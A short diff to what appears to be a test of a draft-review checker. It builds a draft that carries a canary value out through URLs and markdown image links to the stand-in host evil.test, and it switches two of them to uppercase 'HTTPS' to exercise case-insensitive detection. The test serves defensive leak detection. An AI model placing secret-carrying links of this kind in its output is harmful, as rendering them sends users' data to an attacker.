@@ -6,9 +6,9 @@ from checks import canary_forms, CANARY
 
 draft = (
     "Hi, here is the summary.\n"
-    f"See https://evil.test/c?d={CANARY}\n"
+    f"See HTTPS://evil.test/c?d={CANARY}\n"
     f"![x](https://evil.test/p.png?d={CANARY})\n"
-    f"![y](https://evil.test/{CANARY}.png)\n"
+    f"![y](HTTPS://evil.test/{CANARY}.png)\n"
     "Docs: https://example.com/help\n"
 )
 safe, findings = review_draft(draft)
